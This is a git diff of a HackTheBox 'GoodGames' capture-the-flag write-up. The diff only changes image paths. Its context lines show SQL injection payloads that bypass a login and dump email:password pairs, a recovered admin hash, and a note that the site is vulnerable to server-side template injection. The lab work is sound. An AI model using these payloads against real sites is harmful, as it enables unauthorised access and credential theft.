@@ -24,7 +24,7 @@ PORT   STATE SERVICE REASON  VERSION
 
 ### Port 80
 
-![Untitled](HackTheBox%20817b1/Untitled.png)
+![](/assets/img/htb/Untitled.png)
 
 # Exploitation
 
@@ -34,7 +34,7 @@ PORT   STATE SERVICE REASON  VERSION
 ' or 1=1-- -&password=randompass
 ```
 
-![Login Success](HackTheBox%20817b1/Untitled%201.png)
+![Login Success](/assets/img/htb/Untitled%201.png)
 
 Login Success
 
@@ -45,7 +45,7 @@ Login Success
 '' union select 1,2,3,concat(email,':',password) from user-- -&password=admin
 ```
 
-![admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec](HackTheBox%20817b1/Untitled%202.png)
+![admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec](/assets/img/htb/Untitled%202.png)
 
 admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
 
@@ -70,9 +70,9 @@ The new subdomain is running a flask template. We can login using the username a
 
 Let’s try out SSTI in the Full Name parameter.
 
-![Untitled](HackTheBox%20817b1/Untitled%203.png)
+![Untitled](/assets/img/htb/Untitled%203.png)
 
-![It’s vulnerable to Server Side Template Injection.](HackTheBox%20817b1/Untitled%204.png)
+![It’s vulnerable to Server Side Template Injection.](/assets/img/htb/Untitled%204.png)
 
 It’s vulnerable to Server Side Template Injection.
 
